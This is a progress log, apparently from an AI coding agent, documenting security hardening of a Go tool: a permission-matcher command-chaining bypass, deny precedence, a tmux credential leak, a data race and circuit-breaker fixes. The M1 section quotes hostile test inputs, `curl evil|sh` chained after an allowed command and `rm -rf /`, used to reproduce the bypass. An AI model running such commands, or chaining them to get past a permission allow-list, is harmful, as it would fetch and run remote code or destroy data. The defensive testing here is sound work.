# SPEC-SEC-HARDEN-001 — Progress

## §A — Phase 0.95 Mode Selection

**Input parameters**
- tier: L
- scope (file count): ~10-14 (M1 stack.go, M2 conflict.go + conflict_test.go, M3 tmux_integration.go + session.go + tmux_integration_test.go, M4 tracker.go, M5 circuit.go + per-milestone test files)
- domain count: 1 (Go source — security/concurrency internal packages: permission, tmux, lsp, resilience)
- file language mix: 100% Go
- concurrency benefit: LOW (coding-heavy, behavior-preserving security/concurrency fixes — Anthropic coding-task parallelism caveat)
- Agent Teams prereqs: not met (harness not `thorough` / `workflow.team.enabled` not set / env flag unset)

**Mode evaluation**

| Mode | Selected | Rationale |
|------|----------|-----------|
| 1 trivial | no | multi-file semantic security/concurrency changes, not a typo |
| 2 background | no | writes code (not read-only) |
| 3 agent-team | no | Agent Teams prereqs unmet + coding-heavy |
| 4 parallel | no | coding-heavy, not research (Anthropic coding-task parallelism caveat) |
| 5 sub-agent | **YES** | Tier L coding-heavy default; sequential per-milestone |
| 6 workflow | no | not mechanical-uniform (semantic security fixes, inter-milestone behavior reasoning) |

**Decision: sub-agent (Mode 5)** — sequential per-milestone implementation.

**Justification**: Tier L, coding-heavy, behavior-preserving security/concurrency work. Per Anthropic's coding-task parallelism caveat, the sequential sub-agent path (Mode 5) is the safe default; Mode 6 is excluded because the milestones are semantic fixes, not a single uniform mechanical transform. A single `manager-develop` (cycle_type=tdd) delegation implements M1-M5 sequentially with per-milestone commits; the orchestrator independently verifies the batch afterward. L1 `isolation: worktree` is used to isolate run-phase commits from the active parallel SPEC-MERGE-METHOD-CONFIG-001 session that shares the main working tree (Race Absorbed: disjoint scope, no file overlap).

**Plan Audit (Phase 0.5)**: plan-auditor PASS 0.91 (Tier L threshold 0.85, margin +0.06); 3 MINOR defects (D1 M2 deny-precedence dual-phrasing, D2 stale baseline SHA, D3 M2 log-path seam run-phase deferral), none blocking. Report: `.moai/reports/plan-audit/SPEC-SEC-HARDEN-001-2026-06-13.md`.

**GATE-2**: user-approved run-phase entry (구현 착수 승인).

---

## §E.2 — Run-phase Evidence (per-milestone, reproduction-first)

Run-phase executed in L1 worktree `agent-a2eb707deb98eeba8` (base main HEAD `0ef553617`; spawn prompt cited `a0e24ae15`, but the actual worktree base is `0ef553617` — the SPEC defects were re-verified present at the actual base). Pre-flight baseline (pre-change): host build exit 0, `GOOS=windows GOARCH=amd64 go build ./...` exit 0, all 5 touched packages green, `go test -race ./internal/lsp/... ./internal/resilience/...` clean, golangci-lint 0 issues. Baseline coverage: permission 88.7%, tmux 81.4%, lsp/hook 89.5%, resilience 96.7%, cli/worktree 83.7%.

### M1 — Permission `:*` prefix-match command-chain bypass

- **RED confirmed FAILING pre-fix**: `go test -run 'TestMatches_PrefixChainBypass_Reproduction|TestMatches_SeparatorVariants|TestMatches_QuotedSeparatorNotRejected' ./internal/permission/` → FAIL pre-fix. `Matches("Bash", "go test ./...; curl evil|sh")` returned `true` (the bypass), all 7 separator variants matched `true`, and `echo "ok"; rm -rf /` matched `true` — the defect is present at the actual base.
- **GREEN**: added `hasUnquotedShellSeparator(s string) bool` (quote-aware single-pass scan) + guard in the `:*` branch of `stack.go` `Matches`. Fix confined to the `:*` branch only; `/*`, `*.`, exact, wildcard-arg branches untouched.
- **NO-REG**: full `go test ./internal/permission/` green; all pre-existing tests pass unchanged.
- AC: AC-SEC-M1-001 (RED, now inverted to GREEN assertion), M1-002 (GREEN, 7 separator variants), M1-003/004/005 (NO-REG) all PASS.
- Coverage: permission 89.5% (≥ 88.7% baseline, no regression). Lint 0 issues, vet clean.
- Commit: `4738f8eef`.

### M2 — Permission conflict: deny wins on tie + audit log written

- **RED confirmed FAILING pre-fix** (seam var added, logic unchanged): `go test -run 'TestResolveConflict|TestLogConflict' ./internal/permission/` → FAIL pre-fix. `TestResolveConflict_DenyWinsOnTie` got `allow` (deny did NOT win — AC-SEC-M2-001 defect); `TestLogConflict_WritesAuditRecord` got "log not written" (AC-SEC-M2-005 defect); the rewritten D2 casualty `TestResolveConflict_FsOrderTiebreak` also failed pre-fix (it now asserts deny-wins). NO-REG tests (`AllAllowTiePreservesOrigin`, `HigherSpecificityWinsRegardlessOfAction`) passed pre-fix.
- **GREEN**:
  - `conflict.go` `resolveConflict`: max-specificity-set deny-precedence (D1 form) — compute max specificity among ALL matched rules; if the top-specificity set contains a deny, restrict the tiebreak to those denies; else existing specificity-then-Origin loop. Guarantees deny-wins-on-tie AND preserves higher-specificity-wins-regardless-of-action.
  - `logConflict`: best-effort append to `conflictLogDir/permission.log` (default `.moai/logs`, matching existing `logUnreachablePrompt` path); reuses package-level `truncate`. All I/O errors swallowed (decision unaffected).
  - Log-path seam (D3): package-level `var conflictLogDir` overridden by tests via `withConflictLogDir(t, t.TempDir())` — no writes to the real project tree (verified: no `.moai/logs/permission.log` created during tests).
- **D2 intended-behavior-change casualty**: `TestResolveConflict_FsOrderTiebreak` rewritten to assert deny-wins-on-tie (the deny rule from `a-settings.json` wins despite `z-` sorting later). This is the SINGLE pre-existing test whose behavior changed; all other pre-existing tests stay green unchanged.
- AC: M2-001 (RED→GREEN), M2-002 (deny wins), M2-003 (all-allow Origin preserved), M2-004 (higher specificity wins regardless of action), M2-005 (RED→GREEN), M2-006 (log written), M2-007 (unwritable dir → decision unchanged, best-effort) all PASS.
- Coverage: permission 90.2% (≥ 88.7% baseline, no regression). Lint 0, vet clean.
- Commit: `14c598537`.

### M3 — tmux credential argv leak (CWE-214) on worktree `--team` path

- **RED confirmed FAILING pre-fix** (interface method + mock 4th method added so the recording-fake test compiles; `tmux_integration.go` logic unchanged): `go test -run 'TestCreateTmuxSession_' ./internal/cli/worktree/` → FAIL pre-fix. `TestCreateTmuxSession_TokenNotLeakedViaArgv` showed the token value present in the bulk `InjectEnv` map (CWE-214 argv leak), the token KEY still in the map (not deleted), and `InjectSensitiveEnv` never called (0 routes). `TestCreateTmuxSession_NoArgvFallbackOnSensitiveFailure` showed no error returned pre-fix. NO-REG tests (`NonSensitiveVarsStillBulkInjected`, `CCModeNoInjection`) passed pre-fix.
- **GREEN**:
  - §F.5 carve-out: added EXACTLY ONE additive method `InjectSensitiveEnv(ctx, key, value string) error` to the `tmux.SessionManager` interface (`session.go`). `*DefaultSessionManager` already implements it (compile assertion `var _ SessionManager = (*DefaultSessionManager)(nil)` at session.go:68 holds). Interface diff verified: exactly one signature line added, no other method changed.
  - `tmux_integration.go` GLM/CG block: mirror glm.go:389-408 — extract `config.EnvAnthropicAuthToken` → `tmuxMgr.InjectSensitiveEnv` (return wrapped error on failure, NO argv fallback) → `delete` from `cfg.GLMEnvVars` → bulk `InjectEnv` for the remainder. Used `config.EnvAnthropicAuthToken` constant (§14 no-inline-env-string).
  - Test fakes: existing `mockSessionManager` (new_test.go) gained a no-op `InjectSensitiveEnv` (required for interface compliance, unrelated `new` tests); NEW `recordingSessionManager` (4-method fake) records what each injection method received.
- AC: M3-001 (RED→GREEN), M3-002 (token never in argv), M3-003 (token removed from bulk map), M3-004 (non-sensitive still bulk-injected), M3-005 (no argv fallback on sensitive failure + error propagates), M3-006 (cc mode no injection) all PASS.
- Interface diff (E6): `git diff a0e24ae15 -- internal/tmux/session.go` → exactly ONE interface method (`InjectSensitiveEnv`) added; no other public signature changed. (Note: actual base SHA is `0ef553617`; diff verified against HEAD.)
- Cross-platform: host build exit 0, `GOOS=windows GOARCH=amd64 go build ./...` exit 0. Coverage: cli/worktree 84.1% (≥ 83.7% baseline), tmux 81.4% (= baseline). Lint 0, vet clean.
- Commit: `4e18a0749`.

### M4 — LSP regression tracker data race (shared-state write under read lock)

- **RED confirmed FAILING pre-fix under `-race`**: `go test -race -run TestGetBaseline_ConcurrentLazyLoad_NoRace ./internal/lsp/hook/` → `WARNING: DATA RACE` pre-fix. The race detector flagged the write at `tracker.go:128` (`t.baseline = &baseline`) under the `RLock` acquired by `GetBaseline` at line 71 — exactly the documented defect (write-write + read on `t.baseline` from concurrent lazy-load callers). Test design: seed the on-disk baseline via one tracker, then a FRESH tracker (in-memory `t.baseline == nil`) is hammered with 16 concurrent `GetBaseline` calls so every call enters `loadBaselineLocked`.
- **GREEN**: `tracker.go` `GetBaseline` `RLock`/`RUnlock` → `Lock`/`Unlock` (design.md §M4 default; double-checked locking not needed — read path is not hot). `loadBaselineLocked` already early-returns when `t.baseline != nil`, so the second concurrent caller's load is a cheap no-op under the write lock. `CompareWithBaseline` routes through `GetBaseline` and inherits the fix. Observable contract unchanged.
- AC: M4-001 (RED→GREEN, `-race` clean), M4-002 (no data race after fix), M4-003 (single-reader contract: present entry returns baseline, missing entry → `ErrBaselineNotFound`, missing baseline file → `ErrBaselineNotFound`), M4-004 (`CompareWithBaseline` regression detection + `ClearBaseline` unchanged) all PASS.
- `-race`: full `go test -race ./internal/lsp/hook/` clean. Coverage: lsp/hook 90.3% (≥ 89.5% baseline, no regression). Lint 0, vet clean.
- Commit: `a02591529`.

### M5 — Circuit breaker half-open single-permit + recovered callback goroutine

- **RED (half-open permit) confirmed FAILING pre-fix**: `go test -run TestCircuitBreaker_HalfOpenSinglePermit ./internal/resilience/` → FAIL pre-fix. 8 concurrent half-open callers ALL executed `fn()` simultaneously (`concurrentMax=8`, `executed=8`, `rejected=0`) — the single-permit invariant is absent (AC-SEC-M5-001 defect). Test uses a barrier channel so all admitted callers stay in `fn()` simultaneously, exposing the multi-entry.
- **AC-SEC-M5-004 OBSERVATIONAL RED (manual, one-time, NOT committed)**: ran `go test -run TestCircuitBreaker_PanickingCallbackRecovered ./internal/resilience/` against PRE-FIX code. **Observed: the panicking `OnStateChange` propagated from the unrecovered goroutine at `circuit.go:196` (`go cb.config.OnStateChange(...)`) to the Go runtime and CRASHED the entire test binary** — output `panic: intentional callback panic` originating `created by ...transitionTo in goroutine 7` at `circuit.go:196`, aborting the suite (not a graceful test FAIL). This confirms the documented `@MX:WARN` defect. Per design.md §M5 "RED test soundness" (D3), this crash cannot be captured by an automated assertion (it takes the binary down), so it is recorded here as a one-time observation only; the committed/automated verification is AC-SEC-M5-005.
- **GREEN**:
  - Half-open permit: added `halfOpenInFlight bool` (guarded by `cb.mu`). In `Call`, under the state-check lock: if `state == StateHalfOpen` and `halfOpenInFlight` is set → reject with `ErrCircuitOpen` (count); else set it and proceed. Cleared on every post-call resolution (success/failure) and in `Reset()`. The single admitted call still runs `fn()` lock-free (existing non-blocking model preserved).
  - Recover wrapper: `transitionTo`'s `go cb.config.OnStateChange(...)` goroutine body wrapped in `defer func(){ _ = recover() }()` (captured `onStateChange` local to avoid racing on `cb.config`). `@MX:WARN` demoted to `@MX:NOTE` per mx-tag-protocol (danger mitigated).
  - `Reset()` synchronous `OnStateChange` path left UNCHANGED (AC-SEC-M5-006; only the `transitionTo` goroutine gets recover).
- AC: M5-001 (RED→GREEN, single permit), M5-002 (exactly 1 executes, N-1 rejected), M5-003 (permit released after trial → next call governed by new state: success→closed→admit, failure→open→reject), M5-004 (OBSERVATIONAL RED — manual, recorded above), M5-005 (AUTOMATED: panicking callback recovered, process survives, post-state open), M5-006 (closed/open threshold + timeout promotion + half-open success/failure transitions + metrics TotalCalls/SuccessCount/FailureCount/RejectedCount + Reset synchronous path all unchanged) all PASS.
- `-race`: full `go test -race ./internal/resilience/` clean. Coverage: resilience 98.6% (≥ 96.7% baseline, no regression). Lint 0, vet clean.

### M5 invariant note (Reset out of scope)

`Reset()` `OnStateChange` is synchronous by design (line 119 path) and is OUT of M5's panic-recovery scope per AC-SEC-M5-006 — left unchanged (verified by `TestCircuitBreaker_ResetSynchronousCallbackUnchanged`).

---

## §E.3 — Run-phase Audit-Ready Signal

```yaml
run_complete_at: 2026-06-13
run_commit_shas:
  M1: 4738f8eef   # fix permission :* prefix-match command-chain bypass
  M2: 14c598537   # fix permission conflict deny-precedence + audit log
  M3: 4e18a0749   # feat tmux credential argv leak fix (CWE-214) + interface method
  M4: a02591529   # fix LSP tracker data race (write under read lock)
  M5: dafb84023   # fix circuit breaker half-open permit + recovered goroutine
run_status: implemented
worktree: agent-a2eb707deb98eeba8
worktree_base: 0ef553617   # actual base; spawn prompt cited a0e24ae15 (parallel session advanced host main); defects re-verified present at 0ef553617
ac_pass_count: 27          # 27 automated AC PASS (M1×5 + M2×7 + M3×6 + M4×4 + M5×5)
ac_observational_count: 1  # AC-SEC-M5-004 OBSERVATIONAL RED (manual one-time, recorded §E.2 M5)
ac_fail_count: 0
m2_d2_casualty: TestResolveConflict_FsOrderTiebreak   # rewritten to deny-wins-on-tie (intended, only behavior-changed pre-existing test)
cross_platform_build:
  host: pass
  windows_amd64: pass
race_clean: true           # go test -race ./internal/lsp/... ./internal/resilience/... clean
lint_new_issues: 0
vet_clean: true            # go vet ./... clean
cli_smoke: pass            # go run ./cmd/moai --version → moai-adk v3.0.0-rc2
interface_diff: 1          # exactly ONE additive method (tmux.SessionManager.InjectSensitiveEnv); §F.5 carve-out
coverage_no_regression: true
coverage_by_package:
  permission: 90.2%        # baseline 88.7%
  tmux: 81.4%              # baseline 81.4%
  lsp/hook: 90.3%          # baseline 89.5%
  resilience: 98.6%        # baseline 96.7%
  cli/worktree: 84.1%      # baseline 83.7%
exclusions_untouched: true # no cli/cmd, template, statusline, mx, merge, language .md modified
total_run_phase_files: 13  # 6 source + 6 new test files + 1 pre-existing test rewrite (conflict_test.go) — see §E.2; mock 4th method in new_test.go
m1_to_mN_commit_strategy: one commit per milestone (M1-M5), Authored-By-Agent trailer, draft→in-progress on M1
new_warnings_or_lints_introduced: 0
```

### Pre-existing failure (out of scope — blocker report to orchestrator)

`internal/web` has 2 pre-existing test failures (`TestGoldenPath_ReadWriteRoundTrip`, `TestWriteProjectConfigSectionIsolation` / `projectconfig_scope_test.go:49`) that FAIL identically at the clean worktree base `0ef553617` with NO SEC-HARDEN changes (verified via a detached scratch worktree at the base commit). Root cause: the most recent base commit (SPEC-PREPUSH-SAVE-WIRING-001, `0ef553617`) wired `git_strategy` into the config `Save()` WRITE path, which now writes `git-strategy.yaml`, breaking the web sentinel tests that assert it is never touched. `internal/web` does NOT import any of the 5 SEC-HARDEN packages (`go list -deps` confirmed), so SEC-HARDEN cannot have caused it. This is explicitly OUT of SEC-HARDEN scope (§F.1 "config Save / SetSection persistence gap" deferred MEDIUM; §F.3 packages incl. web not reviewed) — NOT fixed here, reported as a blocker.
